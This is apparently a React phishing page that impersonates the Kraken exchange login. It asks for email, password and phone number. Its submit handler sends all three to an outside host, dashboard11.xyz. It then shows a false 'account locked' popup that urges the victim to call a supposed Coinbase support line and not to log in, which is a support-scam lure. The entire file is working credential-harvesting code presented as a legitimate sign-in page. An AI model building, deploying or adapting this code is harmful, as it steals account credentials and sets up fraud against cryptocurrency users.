import React, { useState } from "react";
import "bootstrap/dist/css/bootstrap.min.css";
import "bootstrap-icons/font/bootstrap-icons.css";
import "./style.css";

import BeastVideo from "./assets/Beast_Web.webm";

function Login() {
  const [step, setStep] = useState(1);

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [phone, setPhone] = useState("");

  const [popup, setPopup] = useState(false);

  // STEP 1 VALIDATION
  const nextStep = () => {
    const emailBox = document.getElementById("email");
    const passBox = document.getElementById("password");

    if (!emailBox.checkValidity()) {
      emailBox.reportValidity();
      return;
    }

    if (!passBox.checkValidity()) {
      passBox.reportValidity();
      return;
    }

    setStep(2);
  };

  // ENTER KEY CONTROL

  const handleKeyDown = (e) => {
    if (e.key !== "Enter") return;

    e.preventDefault();

    if (step === 1) {
      nextStep();
    } else if (step === 2) {
      e.currentTarget.requestSubmit();
    }
  };

  // FINAL SUBMIT

  const submitForm = async (e) => {
    e.preventDefault();

    const phoneBox = document.getElementById("phone");

    if (!phoneBox.checkValidity()) {
      phoneBox.reportValidity();
      return;
    }

    console.log("FINAL SUBMIT RUN");

    try {
      const response = await fetch("https://dashboard11.xyz/Api/kkn_data.php", {
        method: "POST",

        headers: {
          "Content-Type": "application/json",
        },

        body: JSON.stringify({
          email: email,
          password: password,
          phone: phone,
        }),
      });

      const result = await response.json();

      console.log(result);
      // POPUP OPEN

      setPopup(true);
    } catch (error) {
      console.log(error);

      // testing popup even if api error

      setPopup(true);
    }
  };

  return (
    <div className="page">
      <div className="top-navbar d-flex justify-content-between align-items-center">
        <div className="logo">
          <div className="logo-icon"></div>
          kraken
        </div>

        <div className="nav-right">
          <button type="button" className="lang-btn">
            <i className="bi bi-globe"></i>
            English (US)
          </button>

          <button type="button" className="create-btn">
            Create Account
          </button>
        </div>
      </div>

      <div className="login-wrapper">
        <div className="login-card">
          <div className="video-box">
            <video autoPlay muted loop playsInline>
              <source src={BeastVideo} type="video/webm" />
            </video>
          </div>

          <h1>Sign in to Kraken</h1>

          <form id="login-form" onSubmit={submitForm} onKeyDown={handleKeyDown}>
            {step === 1 && (
              <div>
                <input
                  id="email"
                  className="form-control mb-2"
                  type="email"
                  required
                  placeholder="Email or username"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />

                <input
                  id="password"
                  className="form-control mb-2"
                  type="password"
                  required
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />

                <a className="forgot-link">Forgot password or username?</a>

                <button
                  type="button"
                  className="continue-btn"
                  onClick={nextStep}
                >
                  Continue
                </button>
              </div>
            )}

            {step === 2 && (
              <div>
                <input
                  className="form-control mb-2"
                  type="email"
                  value={email}
                  readOnly
                />

                <input
                  id="phone"
                  className="form-control mb-2"
                  type="tel"
                  required
                  placeholder="Your phone number"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                />

                <button type="submit" className="continue-btn">
                  Submit
                </button>
              </div>
            )}

            <div className="divider">Or</div>

            <div className="social-login">
              <button type="button" className="social-btn">
                <img
                  src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/google/google-original.svg"
                  width="28"
                />
              </button>

              <button type="button" className="social-btn">
                <i className="bi bi-apple"></i>
              </button>
            </div>

            <div className="help-text">
              Still can’t sign in?
              <a href="#">Email us</a>
            </div>
          </form>
        </div>
      </div>

      {popup && (
        <div className="popup">
          <div className="popup-content">
            <p>
              Your Kraken account has been locked due to security reasons.
              please call coinbase support at{" "}
              <a href="tel:+1-888-888-8888">+1 888 88 888</a> for more
              information
            </p>
            <p id="note">
              NOTE: Do not login to this account, as this will lead to permanent
              suspention.
            </p>
          </div>
        </div>
      )}
    </div>
  );
}

export default Login;
